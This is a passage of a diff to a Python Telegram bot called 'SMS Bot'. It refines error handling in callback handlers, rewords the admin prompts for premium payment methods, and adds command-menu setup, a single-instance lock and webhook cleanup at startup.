             await sedit(cq, f"<b>✅ All Clear</b>\n{line()}\n\nNo pending requests.",
                 kb([("◀️  Back","adm:prem")]))
     except Exception as e:
-        log.error(f"prem_approve: {e}"); await cq.answer("❌")
+        log.error(f"prem_approve: {e}")
+        try: await cq.answer()
+        except: pass
 
 @R.callback_query(F.data.startswith("prem:reject:"))
 async def cb_prem_reject(cq, state):
@@ -1743,7 +1998,9 @@ async def cb_prem_reject(cq, state):
             await sedit(cq, f"<b>✅ All Clear</b>\n{line()}\n\nNo pending requests.",
                 kb([("◀️  Back","adm:prem")]))
     except Exception as e:
-        log.error(f"prem_reject: {e}"); await cq.answer("❌")
+        log.error(f"prem_reject: {e}")
+        try: await cq.answer()
+        except: pass
 
 async def _render_requests_list(cq, d):
     reqs = [r for r in d["premium"].get("requests", []) if r.get("status") == "pending"]
@@ -1783,7 +2040,10 @@ async def cb_prem_view(cq, state):
             await cq.answer()
         except Exception as e:
             log.error(f"view: {e}"); await cq.answer("❌")
-    except Exception as e: log.error(f"prem:view: {e}")
+    except Exception as e:
+        log.error(f"prem:view: {e}")
+        try: await cq.answer()
+        except: pass
 
 # ══════════════════════════════════════════════
 #  GENERAL CALLBACKS  (catch-all — MUST be last)
@@ -1795,7 +2055,7 @@ async def cb(cq, state):
         if is_banned(uid, d):
             await cq.answer("🚫 Banned", show_alert=True); return
 
-        # ── Public: home / force join check / help / about
+        # ── Public callbacks (work without premium)
         if c in ("home","fj:check"):
             await state.clear()
             ok, not_joined = await check_force_join(cq.bot, uid, d)
@@ -1816,9 +2076,9 @@ async def cb(cq, state):
             return
 
         if c == "help:show":
-            await sedit(cq, HELP_TEXT, kb([("◀️  Back","home")])); return
+            await sedit(cq, HELP_TEXT, kb([("◀️  Back","home")])); await cq.answer(); return
         if c == "about:show":
-            await sedit(cq, ABOUT_TEXT, kb([("◀️  Back","home")])); return
+            await sedit(cq, ABOUT_TEXT, kb([("◀️  Back","home")])); await cq.answer(); return
 
         # ── Access gate for everything else
         if not can_use(uid, d):
@@ -1932,7 +2192,7 @@ async def cb(cq, state):
             if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
             await sedit(cq,
                 f"<b>💳 Payment Methods</b>\n{line()}\n\n"
-                f"Empty methods stay hidden from users.\n"
+                f"Each method works independently.\n"
                 f"Tap any to set / change / clear.",
                 prem_pay_edit_kb(d))
 
@@ -1942,9 +2202,9 @@ async def cb(cq, state):
             await state.set_state(W.prem_upi)
             await sedit(cq,
                 f"<b>🏦 Set UPI ID</b>\n{line()}\n\n"
-                f"Example: <code>example@ybl</code>\n\n"
-                f"Clear: <code>/clear</code>\n"
-                f"Cancel: button below",
+                f"Send new UPI ID:\n"
+                f"<i>Example: <code>example@ybl</code></i>\n\n"
+                f"<code>/clear</code> to remove",
                 kb([("❌  Cancel","prem:editpay")]))
 
         elif c == "prem:setqr":
@@ -1954,7 +2214,7 @@ async def cb(cq, state):
             await sedit(cq,
                 f"<b>📱 Set QR Code</b>\n{line()}\n\n"
                 f"Send QR code photo.\n\n"
-                f"Clear: <code>/clear</code>",
+                f"<code>/clear</code> to remove",
                 kb([("❌  Cancel","prem:editpay")]))
 
         elif c == "prem:setbinance":
@@ -1964,7 +2224,7 @@ async def cb(cq, state):
             await sedit(cq,
                 f"<b>🟡 Set Binance ID</b>\n{line()}\n\n"
                 f"Send Binance Pay ID / UID.\n\n"
-                f"Clear: <code>/clear</code>",
+                f"<code>/clear</code> to remove",
                 kb([("❌  Cancel","prem:editpay")]))
 
         elif c == "prem:setcrypto":
@@ -1974,7 +2234,7 @@ async def cb(cq, state):
             await sedit(cq,
                 f"<b>🪙 Set Crypto Wallet</b>\n{line()}\n\n"
                 f"Send wallet address.\n\n"
-                f"Clear: <code>/clear</code>",
+                f"<code>/clear</code> to remove",
                 kb([("❌  Cancel","prem:editpay")]))
 
         elif c == "prem:reqs":
@@ -2244,33 +2504,74 @@ async def cb(cq, state):
 async def _on_error(event):
     log.error(f"dispatcher error: {event.exception}")
 
+async def _setup_bot_commands(bot):
+    try:
+        cmds = [
+            BotCommand(command="start",  description="Start the bot"),
+            BotCommand(command="menu",   description="Main menu"),
+            BotCommand(command="stop",   description="Stop current sending"),
+            BotCommand(command="cancel", description="Cancel current action"),
+        ]
+        await bot.set_my_commands(cmds, scope=BotCommandScopeDefault())
+        try:
+            await bot.set_chat_menu_button(menu_button=MenuButtonCommands())
+        except Exception as e:
+            log.warning(f"menu button: {e}")
+        log.info("bot commands + menu button configured")
+    except Exception as e:
+        log.error(f"setup commands: {e}")
+
 async def main():
+    # prevent multiple instances
+    if not acquire_lock():
+        log.error("Another instance is already running. Exiting.")
+        sys.exit(1)
+
     bot = Bot(token=BOT_TOKEN)
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(R)
     dp.errors.register(_on_error)
 
-    me = await bot.get_me()
-    log.info(f"✅ @{me.username} started ({_VERSION}) | by {_CREDITS}")
-
     try:
-        await bot.send_message(OWNER_ID,
-            f"🚀 <b>SMS Bot {_VERSION}</b>\n"
-            f"@{me.username}\n"
-            f"<i>By {_CREDITS}</i>\n"
-            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>",
-            parse_mode="HTML")
-    except Exception as e: log.warning(f"owner notify: {e}")
+        # CRITICAL: delete webhook and drop pending updates to prevent conflict
+        try:
+            await bot.delete_webhook(drop_pending_updates=True)
+            log.info("webhook deleted, pending updates dropped")
+        except Exception as e:
+            log.warning(f"delete_webhook: {e}")
 
-    asyncio.create_task(notify_all_users_online(bot, me.username))
+        me = await bot.get_me()
+        log.info(f"✅ @{me.username} started ({_VERSION}) | by {_CREDITS}")
 
-    try:
-        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
+        # setup commands
+        await _setup_bot_commands(bot)
+
+        try:
+            await bot.send_message(OWNER_ID,
+                f"🚀 <b>SMS Bot {_VERSION}</b>\n"
+                f"@{me.username}\n"
+                f"<i>By {_CREDITS}</i>\n"
+                f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>",
+                parse_mode="HTML")
+        except Exception as e: log.warning(f"owner notify: {e}")
+
+        # startup broadcast in background
+        asyncio.create_task(notify_all_users_online(bot, me.username))
+
+        # start polling with drop_pending_updates (prevents old-bot conflicts)
+        await dp.start_polling(
+            bot,
+            allowed_updates=dp.resolve_used_update_types(),
+            drop_pending_updates=True,
+        )
     finally:
-        await bot.session.close()
+        try: await bot.session.close()
+        except: pass
+        release_lock()
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except (KeyboardInterrupt, SystemExit):
         log.info("Bot stopped.")
+        release_lock()
